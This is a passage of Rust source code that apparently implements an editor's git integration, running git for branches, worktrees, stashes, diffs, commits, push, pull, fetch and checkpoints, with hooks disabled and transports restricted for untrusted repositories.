                                "100644"
                            } else {
                                "100755"
                            }
                        }
                        #[cfg(not(unix))]
                        {
                            "100644"
                        }
                    };
                    if current_mode != base_mode {
                        tree_diff
                            .entries
                            .insert(path.clone(), TreeDiffStatus::Modified { old });
                        continue;
                    }

                    let hash_output = if metadata.file_type().is_symlink() {
                        let target = smol::fs::read_link(&full_path).await?;
                        let mut child = git
                            .build_command(&["hash-object", "--stdin"])
                            .await
                            .stdin(Stdio::piped())
                            .stdout(Stdio::piped())
                            .spawn()?;
                        let mut stdin = child.stdin.take().context("hash-object has no stdin")?;
                        stdin
                            .write_all(target.as_os_str().as_encoded_bytes())
                            .await?;
                        stdin.flush().await?;
                        drop(stdin);
                        child.output().await?
                    } else {
                        git.build_command(&[
                            OsString::from("hash-object"),
                            OsString::from(format!("--path={}", path.as_unix_str())),
                            OsString::from("--"),
                            full_path.into_os_string(),
                        ])
                        .await
                        .output()
                        .await?
                    };
                    if !hash_output.status.success() {
                        continue;
                    }
                    let worktree_oid = String::from_utf8_lossy(&hash_output.stdout);
                    if worktree_oid.trim() == old.to_string() {
                        tree_diff.entries.remove(&path);
                    } else {
                        tree_diff
                            .entries
                            .insert(path.clone(), TreeDiffStatus::Modified { old });
                    }
                }
                Ok(tree_diff)
            })
            .boxed()
    }

    fn stash_entries(&self) -> BoxFuture<'static, Result<GitStash>> {
        let git = self.git_binary_in_worktree();
        self.executor
            .spawn(async move {
                let git = git?;
                let output = git
                    .build_command(&["stash", "list", "--pretty=format:%gd%x00%H%x00%ct%x00%s"])
                    .await
                    .output()
                    .await?;
                if output.status.success() {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    stdout.parse()
                } else {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    anyhow::bail!("git status failed: {stderr}");
                }
            })
            .boxed()
    }

    fn branches(&self) -> BoxFuture<'_, Result<BranchesScanResult>> {
        let git = self.git_binary();
        let common_dir = self.common_dir.clone();
        self.executor
            .spawn(async move {
                let version = git.version().await;
                let output = git
                    .build_command(&branch_list_args(version))
                    .await
                    .output()
                    .await?;

                let error = if output.status.success() {
                    None
                } else {
                    let error = format_branch_scan_error(&output);
                    log::warn!("failed to get git branches with commit metadata: {error}");
                    Some(error.into())
                };

                let input = String::from_utf8_lossy(&output.stdout);
                let mut branches = parse_branch_input(&input, version)?;
                // Partial output would make listed upstreams look deleted.
                if output.status.success() {
                    mark_missing_upstreams_gone(&mut branches);
                }
                if !GitFeature::BranchListAtoms.is_supported_by(version) {
                    complete_branches_without_head_and_track_atoms(&git, &mut branches).await;
                }
                count_head_tracking(&git, &mut branches).await;
                let ref_storage =
                    scan_ref_storage(&common_dir, LOOSE_REF_COUNT_LIMIT, REF_STORAGE_SCAN_BUDGET);
                if branches.is_empty() {
                    let args = vec!["symbolic-ref", "--quiet", "HEAD"];

                    let output = git.build_command(&args).await.output().await?;

                    // git symbolic-ref returns a non-0 exit code if HEAD points
                    // to something other than a branch
                    if output.status.success() {
                        let name = String::from_utf8_lossy(&output.stdout).trim().to_string();

                        branches.push(Branch {
                            ref_name: name.into(),
                            is_head: true,
                            upstream: None,
                            most_recent_commit: None,
                        });
                    }
                }

                Ok(BranchesScanResult {
                    branches,
                    error,
                    ref_storage,
                })
            })
            .boxed()
    }

    fn worktrees(&self) -> BoxFuture<'_, Result<Vec<Worktree>>> {
        let git = self.git_binary();
        let common_dir = self.common_dir.clone();
        let main_worktree_path = original_repo_path_from_common_dir(&self.common_dir);
        self.executor
            .spawn(async move {
                if !GitFeature::WorktreeList.is_supported_by(git.version().await) {
                    return list_main_worktree(&git, &common_dir, main_worktree_path).await;
                }
                let output = git
                    .build_command(&["worktree", "list", "--porcelain"])
                    .await
                    .output()
                    .await?;
                if output.status.success() {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    Ok(parse_worktrees_from_str(
                        &stdout,
                        main_worktree_path.as_deref(),
                    ))
                } else {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    anyhow::bail!("git worktree list failed: {stderr}");
                }
            })
            .boxed()
    }

    fn worktree_created_at(
        &self,
        worktree_path: PathBuf,
    ) -> BoxFuture<'_, Result<Option<SystemTime>>> {
        self.executor
            .spawn(async move {
                match std::fs::metadata(&worktree_path) {
                    Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
                        return Ok(None);
                    }
                    Err(error) => {
                        return Err(error).with_context(|| {
                            format!("failed to stat {}", worktree_path.display())
                        });
                    }
                    Ok(_) => {}
                }
                let git_dir = linked_worktree_git_dir(&worktree_path)?;
                let metadata = std::fs::metadata(&git_dir)
                    .with_context(|| format!("failed to stat {}", git_dir.display()))?;
                let created_at = metadata.created().with_context(|| {
                    format!("creation time unavailable for {}", git_dir.display())
                })?;
                Ok(Some(created_at))
            })
            .boxed()
    }

    fn create_worktree(
        &self,
        target: CreateWorktreeTarget,
        path: PathBuf,
    ) -> BoxFuture<'_, Result<()>> {
        let git = self.git_binary();
        let mut args = vec![OsString::from("worktree"), OsString::from("add")];

        match &target {
            CreateWorktreeTarget::ExistingBranch { branch_name } => {
                args.push(OsString::from("--"));
                args.push(OsString::from(path.as_os_str()));
                args.push(OsString::from(branch_name));
            }
            CreateWorktreeTarget::NewBranch {
                branch_name,
                base_sha: start_point,
            } => {
                args.push(OsString::from("-b"));
                args.push(OsString::from(branch_name));
                args.push(OsString::from("--"));
                args.push(OsString::from(path.as_os_str()));
                args.push(OsString::from(start_point.as_deref().unwrap_or("HEAD")));
            }
            CreateWorktreeTarget::Detached {
                base_sha: start_point,
            } => {
                args.push(OsString::from("--detach"));
                args.push(OsString::from("--"));
                args.push(OsString::from(path.as_os_str()));
                args.push(OsString::from(start_point.as_deref().unwrap_or("HEAD")));
            }
        }

        self.executor
            .spawn(async move {
                GitFeature::WorktreeAdd.require(
                    git.version().await,
                    i18n::tc!("git result", "Create worktree"),
                )?;
                // `git worktree add` checks the new worktree out, which runs the post-checkout
                // hook.
                git.ensure_hooks_are_disabled_if_untrusted(i18n::tc!(
                    "git result",
                    "Create worktree"
                ))
                .await?;
                std::fs::create_dir_all(path.parent().unwrap_or(&path))?;
                let output = git.build_command(&args).await.output().await?;
                if output.status.success() {
                    Ok(())
                } else {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    anyhow::bail!("git worktree add failed: {stderr}");
                }
            })
            .boxed()
    }

    fn remove_worktree(&self, path: PathBuf, force: bool) -> BoxFuture<'_, Result<()>> {
        let git = self.git_binary();

        self.executor
            .spawn(async move {
                GitFeature::WorktreeRemove.require(
                    git.version().await,
                    i18n::tc!("git result", "Remove worktree"),
                )?;
                let mut args: Vec<OsString> = vec!["worktree".into(), "remove".into()];
                if force {
                    args.push("--force".into());
                }
                args.push("--".into());
                args.push(path.as_os_str().into());
                git.run(&args).await?;
                anyhow::Ok(())
            })
            .boxed()
    }

    fn rename_worktree(&self, old_path: PathBuf, new_path: PathBuf) -> BoxFuture<'_, Result<()>> {
        let git = self.git_binary();

        self.executor
            .spawn(async move {
                GitFeature::WorktreeRemove.require(
                    git.version().await,
                    i18n::tc!("git result", "Move worktree"),
                )?;
                let args: Vec<OsString> = vec![
                    "worktree".into(),
                    "move".into(),
                    "--".into(),
                    old_path.as_os_str().into(),
                    new_path.as_os_str().into(),
                ];
                git.run(&args).await?;
                anyhow::Ok(())
            })
            .boxed()
    }

    fn checkout_branch_in_worktree(
        &self,
        branch_name: String,
        worktree_path: PathBuf,
        create: bool,
    ) -> BoxFuture<'_, Result<()>> {
        let git_binary = GitBinary::new(
            self.any_git_binary_path.clone(),
            worktree_path,
            self.path(),
            self.executor.clone(),
            self.is_trusted(),
        );

        self.executor
            .spawn(async move {
                git_binary
                    .ensure_hooks_are_disabled_if_untrusted(i18n::tc!(
                        "git result",
                        "Switch branch"
                    ))
                    .await?;
                if create {
                    git_binary.run(&["checkout", "-b", &branch_name]).await?;
                } else {
                    git_binary.run(&["checkout", &branch_name]).await?;
                }
                anyhow::Ok(())
            })
            .boxed()
    }

    fn change_branch(&self, name: String) -> BoxFuture<'_, Result<()>> {
        let git_binary = self.git_binary_in_worktree();
        self.executor
            .spawn(async move {
                let git_binary = git_binary?;
                git_binary
                    .ensure_hooks_are_disabled_if_untrusted(i18n::tc!(
                        "git result",
                        "Switch branch"
                    ))
                    .await?;
                let local_ref = format!("refs/heads/{name}");
                if git_binary
                    .run(&["show-ref", "--verify", "--quiet", &local_ref])
                    .await
                    .is_ok()
                {
                    git_binary.run(&["checkout", &name]).await?;
                    return anyhow::Ok(());
                }

                let remote_ref = format!("refs/remotes/{name}");
                if git_binary
                    .run(&["show-ref", "--verify", "--quiet", &remote_ref])
                    .await
                    .is_ok()
                {
                    let name = match git_binary.run(&["symbolic-ref", &remote_ref]).await {
                        Ok(resolved) => resolved
                            .strip_prefix("refs/remotes/")
                            .map(str::to_owned)
                            .unwrap_or(name),
                        Err(_) => name,
                    };
                    let (_, branch_name) =
                        name.split_once('/').context("Unexpected branch format")?;
                    let local_branch_ref = format!("refs/heads/{branch_name}");
                    if git_binary
                        .run(&["show-ref", "--verify", "--quiet", &local_branch_ref])
                        .await
                        .is_ok()
                    {
                        let set_upstream_args = if GitFeature::SetUpstreamTo
                            .is_supported_by(git_binary.version().await)
                        {
                            ["branch", "--set-upstream-to", name.as_str(), branch_name]
                        } else {
                            // Before git 1.8 only `--set-upstream` exists, and it takes the
                            // branch first.
                            ["branch", "--set-upstream", branch_name, name.as_str()]
                        };
                        git_binary.run(&set_upstream_args).await?;
                    } else {
                        git_binary
                            .run(&["branch", "--track", branch_name, &name])
                            .await?;
                    }

                    git_binary.run(&["checkout", branch_name]).await?;
                    return anyhow::Ok(());
                }

                anyhow::bail!("Branch '{}' not found", name);
            })
            .boxed()
    }

    fn create_branch(
        &self,
        name: String,
        base_branch: Option<String>,
    ) -> BoxFuture<'_, Result<()>> {
        let git_binary = self.git_binary_in_worktree();

        self.executor
            .spawn(async move {
                let git_binary = git_binary?;
                git_binary
                    .ensure_hooks_are_disabled_if_untrusted(i18n::tc!(
                        "git result",
                        "Create branch"
                    ))
                    .await?;
                let mut args =
                    if GitFeature::SwitchAndRestore.is_supported_by(git_binary.version().await) {
                        vec!["switch", "-c", &name]
                    } else {
                        vec!["checkout", "-b", &name]
                    };
                if let Some(base) = base_branch.as_deref() {
                    args.push(base);
                }

                git_binary.run(&args).await?;
                anyhow::Ok(())
            })
            .boxed()
    }

    fn rename_branch(&self, branch: String, new_name: String) -> BoxFuture<'_, Result<()>> {
        let git_binary = self.git_binary_in_worktree();

        self.executor
            .spawn(async move {
                let git_binary = git_binary?;
                git_binary
                    .run(&["branch", "-m", &branch, &new_name])
                    .await?;
                anyhow::Ok(())
            })
            .boxed()
    }

    fn delete_branch(
        &self,
        is_remote: bool,
        name: String,
        force: bool,
    ) -> BoxFuture<'_, Result<()>> {
        let git_binary = self.git_binary_in_worktree();

        self.executor
            .spawn(async move {
                let git_binary = git_binary?;
                let flag = delete_branch_flag(is_remote, force);
                git_binary.run(&["branch", flag, &name]).await?;
                anyhow::Ok(())
            })
            .boxed()
    }

    fn blame(
        &self,
        path: RepoPath,
        content: Rope,
        line_ending: LineEnding,
    ) -> BoxFuture<'_, Result<crate::blame::Blame>> {
        let git = self.git_binary_in_worktree();

        self.executor
            .spawn(async move {
                let git = git?;
                crate::blame::Blame::for_path(&git, &path, &content, line_ending).await
            })
            .boxed()
    }

    fn blame_at_revision(
        &self,
        path: RepoPath,
        revision: Oid,
    ) -> BoxFuture<'_, Result<crate::blame::Blame>> {
        let git = self.git_binary_in_worktree();

        self.executor
            .spawn(async move {
                let git = git?;
                crate::blame::Blame::for_path_at_revision(&git, &path, revision).await
            })
            .boxed()
    }

    fn diff(&self, diff: DiffType) -> BoxFuture<'_, Result<String>> {
        let git = self.git_binary_in_worktree();
        self.executor
            .spawn(async move {
                let git = git?;
                let output = match diff {
                    DiffType::HeadToIndex => {
                        git.build_command(&["diff", "--staged"])
                            .await
                            .output()
                            .await?
                    }
                    DiffType::HeadToWorktree => git.build_command(&["diff"]).await.output().await?,
                    DiffType::MergeBase { base_ref } => {
                        if GitFeature::DiffMergeBase.is_supported_by(git.version().await) {
                            git.build_command(&["diff", "--merge-base", base_ref.as_ref(), "--"])
                                .await
                                .output()
                                .await?
                        } else {
                            let merge_base =
                                resolve_merge_base(&git, base_ref.as_ref(), "HEAD").await?;
                            git.build_command(&["diff", merge_base.as_str(), "--"])
                                .await
                                .output()
                                .await?
                        }
                    }
                };

                anyhow::ensure!(
                    output.status.success(),
                    "Failed to run git diff:\n{}",
                    String::from_utf8_lossy(&output.stderr)
                );
                Ok(String::from_utf8_lossy(&output.stdout).to_string())
            })
            .boxed()
    }

    fn run_command(
        &self,
        args: Vec<String>,
        stdin: Option<String>,
        env: Arc<HashMap<String, String>>,
        command_env: HashMap<String, String>,
    ) -> BoxFuture<'_, Result<GitCommandOutput>> {
        let git = self.git_binary_in_worktree();
        self.executor
            .spawn(run_allowed_git_command(
                git,
                args,
                stdin,
                env,
                command_env,
                HookPolicy::Repository,
            ))
            .boxed()
    }

    fn run_command_without_hooks(
        &self,
        args: Vec<String>,
        stdin: Option<String>,
        env: Arc<HashMap<String, String>>,
        command_env: HashMap<String, String>,
    ) -> BoxFuture<'_, Result<GitCommandOutput>> {
        let git = self.git_binary_in_worktree().map(GitBinary::untrusted);
        self.executor
            .spawn(run_allowed_git_command(
                git,
                args,
                stdin,
                env,
                command_env,
                HookPolicy::Disabled,
            ))
            .boxed()
    }

    fn diff_stat(
        &self,
        diff: DiffStatType,
        path_prefixes: &[RepoPath],
    ) -> BoxFuture<'static, Result<crate::status::GitDiffStat>> {
        let path_prefixes = path_prefixes.to_vec();
        let git_binary = self.git_binary_in_worktree();

        self.executor
            .spawn(async move {
                let git_binary = git_binary?;
                let mut args: Vec<String> =
                    vec!["diff".into(), "--numstat".into(), "--no-renames".into()];
                match diff {
                    DiffStatType::HeadToIndex => args.extend(["--cached".into(), "HEAD".into()]),
                    DiffStatType::HeadToWorktree => args.push("HEAD".into()),
                    DiffStatType::IndexToWorktree => {}
                }
                if !path_prefixes.is_empty() {
                    args.push("--".into());
                    args.extend(
                        path_prefixes
                            .iter()
                            .map(|p| p.as_std_path().to_string_lossy().into_owned()),
                    );
                }
                let output = git_binary.run(&args).await?;
                Ok(crate::status::parse_numstat(&output))
            })
            .boxed()
    }

    fn stage_paths(
        &self,
        paths: Vec<RepoPath>,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>> {
        let git = self.git_binary_in_worktree();
        self.executor
            .spawn(async move {
                let git = git?;
                if !paths.is_empty() {
                    let output = git
                        .build_command(&["update-index", "--add", "--remove", "--"])
                        .await
                        .envs(env.iter())
                        .args(paths.iter().map(|p| p.as_unix_str()))
                        .output()
                        .await?;
                    anyhow::ensure!(
                        output.status.success(),
                        "Failed to stage paths:\n{}",
                        String::from_utf8_lossy(&output.stderr),
                    );
                }
                Ok(())
            })
            .boxed()
    }

    fn unstage_paths(
        &self,
        paths: Vec<RepoPath>,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>> {
        let git = self.git_binary_in_worktree();

        self.executor
            .spawn(async move {
                let git = git?;
                if !paths.is_empty() {
                    let output = git
                        .build_command(&["reset", "--quiet", "--"])
                        .await
                        .envs(env.iter())
                        .args(paths.iter().map(|p| p.as_std_path()))
                        .output()
                        .await?;

                    anyhow::ensure!(
                        output.status.success(),
                        "Failed to unstage:\n{}",
                        String::from_utf8_lossy(&output.stderr),
                    );
                }
                Ok(())
            })
            .boxed()
    }

    fn stash_paths(
        &self,
        paths: Vec<RepoPath>,
        message: Option<String>,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>> {
        let git = self.git_binary_in_worktree();
        self.executor
            .spawn(async move {
                let git = git?;
                let version = git.version().await;
                let stash = if GitFeature::StashPushWithUntrackedPaths.is_supported_by(version) {
                    let mut args = vec!["stash", "push", "--quiet", "--include-untracked"];
                    if let Some(message) = message.as_deref() {
                        args.extend_from_slice(&["--message", message]);
                    }
                    args.push("--");
                    StashCommand {
                        args: args.into_iter().map(String::from).collect(),
                        with_requested_paths: true,
                    }
                } else {
                    let status_args = git_status_args(&[], StatusUntrackedFiles::All, version);
                    let status_output = git.build_command(&status_args).await.output().await?;
                    anyhow::ensure!(
                        status_output.status.success(),
                        "git status failed: {}",
                        String::from_utf8_lossy(&status_output.stderr)
                    );
                    let status =
                        String::from_utf8_lossy(&status_output.stdout).parse::<GitStatus>()?;
                    legacy_stash_command(&paths, &status, message.as_deref(), version)?
                };
                let mut command = git.build_command(&stash.args).await;
                command.envs(env.iter());
                if stash.with_requested_paths {
                    command.args(paths.iter().map(|p| p.as_unix_str()));
                }
                let output = command.output().await?;

                anyhow::ensure!(
                    output.status.success(),
                    "Failed to stash:\n{}",
                    String::from_utf8_lossy(&output.stderr)
                );
                Ok(())
            })
            .boxed()
    }

    fn stash_staged(
        &self,
        message: Option<String>,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>> {
        let git = self.git_binary_in_worktree();
        self.executor
            .spawn(async move {
                let git = git?;
                GitFeature::StashStaged.require(
                    git.version().await,
                    i18n::tc!("git result", "Stash staged changes"),
                )?;
                // `--staged` cannot be expressed as a pathspec: a partially staged
                // file would otherwise have its unstaged hunks stashed too.
                let mut args = vec!["stash", "push", "--quiet", "--staged"];
                if let Some(message) = message.as_deref() {
                    args.extend_from_slice(&["--message", message]);
                }
                let output = git
                    .build_command(&args)
                    .await
                    .envs(env.iter())
                    .output()
                    .await?;

                anyhow::ensure!(
                    output.status.success(),
                    "Failed to stash staged changes (requires git 2.35 or newer):\n{}",
                    String::from_utf8_lossy(&output.stderr)
                );
                Ok(())
            })
            .boxed()
    }

    fn stash_pop(
        &self,
        index: Option<usize>,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>> {
        let git = self.git_binary_in_worktree();
        self.executor
            .spawn(async move {
                let git = git?;
                let mut args = vec!["stash".to_string(), "pop".to_string()];
                if let Some(index) = index {
                    args.push(format!("stash@{{{}}}", index));
                }
                let output = git
                    .build_command(&args)
                    .await
                    .envs(env.iter())
                    .output()
                    .await?;

                anyhow::ensure!(
                    output.status.success(),
                    "Failed to stash pop:\n{}",
                    String::from_utf8_lossy(&output.stderr)
                );
                Ok(())
            })
            .boxed()
    }

    fn stash_apply(
        &self,
        index: Option<usize>,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>> {
        let git = self.git_binary_in_worktree();
        self.executor
            .spawn(async move {
                let git = git?;
                let mut args = vec!["stash".to_string(), "apply".to_string()];
                if let Some(index) = index {
                    args.push(format!("stash@{{{}}}", index));
                }
                let output = git
                    .build_command(&args)
                    .await
                    .envs(env.iter())
                    .output()
                    .await?;

                anyhow::ensure!(
                    output.status.success(),
                    "Failed to apply stash:\n{}",
                    String::from_utf8_lossy(&output.stderr)
                );
                Ok(())
            })
            .boxed()
    }

    fn stash_drop(
        &self,
        index: Option<usize>,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>> {
        let git = self.git_binary_in_worktree();
        self.executor
            .spawn(async move {
                let git = git?;
                let mut args = vec!["stash".to_string(), "drop".to_string()];
                if let Some(index) = index {
                    args.push(format!("stash@{{{}}}", index));
                }
                let output = git
                    .build_command(&args)
                    .await
                    .envs(env.iter())
                    .output()
                    .await?;

                anyhow::ensure!(
                    output.status.success(),
                    "Failed to stash drop:\n{}",
                    String::from_utf8_lossy(&output.stderr)
                );
                Ok(())
            })
            .boxed()
    }

    fn commit(
        &self,
        message: SharedString,
        name_and_email: Option<(SharedString, SharedString)>,
        options: CommitOptions,
        ask_pass: AskPassDelegate,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>> {
        let git = self.git_binary_in_worktree();
        let executor = self.executor.clone();
        // Note: Do not spawn this command on the background thread, it might pop open the credential helper
        // which we want to block on.
        async move {
            let git = git?;
            git.ensure_hooks_are_disabled_if_untrusted(i18n::tc!("git result", "Commit"))
                .await?;
            let (mut cmd, untrusted_overrides) = git
                .build_command_with_overrides(&["commit", "--quiet", "-m"])
                .await;
            cmd.envs(env.iter())
                .arg(&message.to_string())
                .arg("--cleanup=strip")
                .stdout(Stdio::piped())
                .stderr(Stdio::piped());

            if options.amend {
                cmd.arg("--amend");
            }

            if options.signoff {
                cmd.arg("--signoff");
            }

            if options.allow_empty {
                cmd.arg("--allow-empty");
            }

            if options.no_verify {
                cmd.arg("--no-verify");
            }

            if let Some((name, email)) = name_and_email {
                cmd.arg("--author").arg(&format!("{name} <{email}>"));
            }

            run_git_command(env, ask_pass, cmd, executor).await?;

            if untrusted_overrides.is_some_and(|overrides| overrides.signing_is_skipped()) {
                return Err(CommittedWithoutSignature.into());
            }
            Ok(())
        }
        .boxed()
    }

    fn update_ref(&self, ref_name: String, commit: String) -> BoxFuture<'_, Result<()>> {
        self.edit_ref(RefEdit::Update { ref_name, commit })
    }

    fn delete_ref(&self, ref_name: String) -> BoxFuture<'_, Result<()>> {
        self.edit_ref(RefEdit::Delete { ref_name })
    }

    fn repair_worktrees(&self) -> BoxFuture<'_, Result<()>> {
        let git = self.git_binary();
        self.executor
            .spawn(async move {
                GitFeature::WorktreeRepair.require(
                    git.version().await,
                    i18n::tc!("git result", "Repair worktree"),
                )?;
                let args: Vec<OsString> = vec!["worktree".into(), "repair".into()];
                git.run(&args).await?;
                Ok(())
            })
            .boxed()
    }

    fn push(
        &self,
        branch_name: String,
        remote_branch_name: String,
        remote_name: String,
        options: Option<PushOptions>,
        ask_pass: AskPassDelegate,
        env: Arc<HashMap<String, String>>,
        cx: AsyncApp,
    ) -> BoxFuture<'_, Result<RemoteCommandOutput>> {
        let working_directory = self.command_directory();
        let git_directory = self.path();
        let executor = cx.background_executor().clone();
        let git_binary_path = self.system_git_binary_path.clone();
        let is_trusted = self.is_trusted();
        let identity = self.identity();
        // Note: Do not spawn this command on the background thread, it might pop open the credential helper
        // which we want to block on.
        async move {
            let git_binary_path = git_binary_path.context("git not found on $PATH, can't push")?;
            let git = GitBinary::new(
                git_binary_path,
                working_directory,
                git_directory,
                executor.clone(),
                is_trusted,
            )
            .with_identity(identity);
            git.ensure_transports_are_restricted_if_untrusted(i18n::tc!("git result", "Push"))
                .await?;
            if options == Some(PushOptions::Force) {
                GitFeature::ForceWithLease.require(
                    git.version().await,
                    i18n::tc!("git result", "Force push (--force-with-lease)"),
                )?;
            }
            let mut command = git.build_command(&["push"]).await;
            command
                .envs(env.iter())
                .args(options.map(PushOptions::flag))
                .arg(remote_name)
                .arg(format!("{}:{}", branch_name, remote_branch_name))
                .stdin(Stdio::null())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped());

            run_git_command(env, ask_pass, command, executor).await
        }
        .boxed()
    }

    fn pull(
        &self,
        branch_name: Option<String>,
        remote_name: String,
        rebase: bool,
        ask_pass: AskPassDelegate,
        env: Arc<HashMap<String, String>>,
        cx: AsyncApp,
    ) -> BoxFuture<'_, Result<RemoteCommandOutput>> {
        let working_directory = self.command_directory();
        let git_directory = self.path();
        let executor = cx.background_executor().clone();
        let git_binary_path = self.system_git_binary_path.clone();
        let is_trusted = self.is_trusted();
        let identity = self.identity();
        // Note: Do not spawn this command on the background thread, it might pop open the credential helper
        // which we want to block on.
        async move {
            let git_binary_path = git_binary_path.context("git not found on $PATH, can't pull")?;
            let git = GitBinary::new(
                git_binary_path,
                working_directory,
                git_directory,
                executor.clone(),
                is_trusted,
            )
            .with_identity(identity);
            git.ensure_transports_are_restricted_if_untrusted(i18n::tc!("git result", "Pull"))
                .await?;
            let mut command = git.build_command(&["pull"]).await;
            command.envs(env.iter());

            if rebase {
                command.arg("--rebase");
            }

            command
                .arg(remote_name)
                .args(branch_name)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped());

            run_git_command(env, ask_pass, command, executor).await
        }
        .boxed()
    }

    fn fetch(
        &self,
        fetch_options: FetchOptions,
        ask_pass: AskPassDelegate,
        env: Arc<HashMap<String, String>>,
        cx: AsyncApp,
    ) -> BoxFuture<'_, Result<RemoteCommandOutput>> {
        let working_directory = self.command_directory();
        let git_directory = self.path();
        let remote_name = format!("{}", fetch_options);
        let git_binary_path = self.system_git_binary_path.clone();
        let executor = cx.background_executor().clone();
        let is_trusted = self.is_trusted();
        let identity = self.identity();
        // Note: Do not spawn this command on the background thread, it might pop open the credential helper
        // which we want to block on.
        async move {
            let git_binary_path = git_binary_path.context("git not found on $PATH, can't fetch")?;
            let git = GitBinary::new(
                git_binary_path,
                working_directory,
                git_directory,
                executor.clone(),
                is_trusted,
            )
            .with_identity(identity);
            git.ensure_transports_are_restricted_if_untrusted(i18n::tc!("git result", "Fetch"))
                .await?;
            let mut command = git.build_command(&["fetch", &remote_name]).await;
            command
                .envs(env.iter())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped());

            run_git_command(env, ask_pass, command, executor).await
        }
        .boxed()
    }

    fn get_push_remote(&self, branch: String) -> BoxFuture<'_, Result<Option<Remote>>> {
        let git = self.git_binary();
        self.executor
            .spawn(async move {
                let output = git
                    .build_command(&["rev-parse", "--abbrev-ref"])
                    .await
                    .arg(format!("{branch}@{{push}}"))
                    .output()
                    .await?;
                if !output.status.success() {
                    return Ok(None);
                }
                let remote_name = String::from_utf8_lossy(&output.stdout)
                    .split('/')
                    .next()
                    .map(|name| Remote {
                        name: name.trim().to_string().into(),
                    });

                Ok(remote_name)
            })
            .boxed()
    }

    fn get_branch_remote(&self, branch: String) -> BoxFuture<'_, Result<Option<Remote>>> {
        let git = self.git_binary();
        self.executor
            .spawn(async move {
                let output = git
                    .build_command(&["config", "--get"])
                    .await
                    .arg(format!("branch.{branch}.remote"))
                    .output()
                    .await?;
                if !output.status.success() {
                    return Ok(None);
                }

                let remote_name = String::from_utf8_lossy(&output.stdout);
                return Ok(Some(Remote {
                    name: remote_name.trim().to_string().into(),
                }));
            })
            .boxed()
    }

    fn get_all_remotes(&self) -> BoxFuture<'_, Result<Vec<Remote>>> {
        let git = self.git_binary();
        self.executor
            .spawn(async move {
                let output = git.build_command(&["remote", "-v"]).await.output().await?;

                anyhow::ensure!(
                    output.status.success(),
                    "Failed to get all remotes:\n{}",
                    String::from_utf8_lossy(&output.stderr)
                );
                let remote_names: HashSet<Remote> = String::from_utf8_lossy(&output.stdout)
                    .lines()
                    .filter(|line| !line.is_empty())
                    .filter_map(|line| {
                        let mut split_line = line.split_whitespace();
                        let remote_name = split_line.next()?;

                        Some(Remote {
                            name: remote_name.trim().to_string().into(),
                        })
                    })
                    .collect();

                Ok(remote_names.into_iter().collect())
            })
            .boxed()
    }

    fn remove_remote(&self, name: String) -> BoxFuture<'_, Result<()>> {
        let git_binary = self.git_binary();
        self.executor
            .spawn(async move {
                let subcommand =
                    if GitFeature::RemoteRemove.is_supported_by(git_binary.version().await) {
                        "remove"
                    } else {
                        "rm"
                    };
                git_binary.run(&["remote", subcommand, &name]).await?;
                Ok(())
            })
            .boxed()
    }

    fn create_remote(&self, name: String, url: String) -> BoxFuture<'_, Result<()>> {
        let git_binary = self.git_binary();
        self.executor
            .spawn(async move {
                git_binary.run(&["remote", "add", &name, &url]).await?;
                Ok(())
            })
            .boxed()
    }

    fn check_for_pushed_commit(&self) -> BoxFuture<'_, Result<Vec<SharedString>>> {
        let git = self.git_binary_in_worktree();
        self.executor
            .spawn(async move {
                // This command outputs a list of remote tracking refs, e.g.:
                // refs/remotes/origin/HEAD
                // refs/remotes/origin/main
                let git = git?;
                if !GitFeature::ForEachRefContains.is_supported_by(git.version().await) {
                    let Some(output) = git
                        .run(&["branch", "-r", "--no-color", "--contains", "HEAD"])
                        .await
                        .log_err()
                    else {
                        return Ok(Vec::new());
                    };
                    return Ok(parse_remote_branches_containing(&output));
                }
                let Ok(output) = git
                    .run(&[
                        "for-each-ref",
                        "--format=%(refname)",
                        "--contains",
                        "HEAD",
                        "refs/remotes/",
                    ])
                    .await
                else {
                    return Ok(Vec::new());
                };

                Ok(output
                    .lines()
                    .map(|line| line.trim())
                    .filter(|line| !line.ends_with("/HEAD"))
                    .filter_map(|line| line.strip_prefix("refs/remotes/"))
                    .map(SharedString::from)
                    .collect())
            })
            .boxed()
    }

    fn checkpoint(&self) -> BoxFuture<'static, Result<GitRepositoryCheckpoint>> {
        let git = self.git_binary_in_worktree();
        self.executor
            .spawn(async move {
                let mut git = git?.envs(checkpoint_author_envs());
                git.with_temp_index(async |git| {
                    let head_sha = git.run(&["rev-parse", "HEAD"]).await.ok();

                    git.run(&["add", "--update"]).await?;
                    let untracked_files = untracked_files_for_checkpoint(git).await?;
                    add_files_to_index(git, &untracked_files).await?;
                    let tree = git.run(&["write-tree"]).await?;
                    let checkpoint_sha = if let Some(head_sha) = head_sha.as_deref() {
                        git.run(&["commit-tree", &tree, "-p", head_sha, "-m", "Checkpoint"])
                            .await?
                    } else {
                        git.run(&["commit-tree", &tree, "-m", "Checkpoint"]).await?
                    };

                    Ok(GitRepositoryCheckpoint {
                        commit_sha: checkpoint_sha.parse()?,
                    })
                })
                .await
            })
            .boxed()
    }

    fn restore_checkpoint(&self, checkpoint: GitRepositoryCheckpoint) -> BoxFuture<'_, Result<()>> {
        let git = self.git_binary_in_worktree();
        self.executor
            .spawn(async move {
                let mut git = git?;
                git.ensure_hooks_are_disabled_if_untrusted(i18n::tc!(
                    "git result",
                    "Restore checkpoint"
                ))
                .await?;
                let commit_sha = checkpoint.commit_sha.to_string();
                if GitFeature::SwitchAndRestore.is_supported_by(git.version().await) {
                    git.run(&["restore", "--source", &commit_sha, "--worktree", "."])
                        .await?;
                } else {
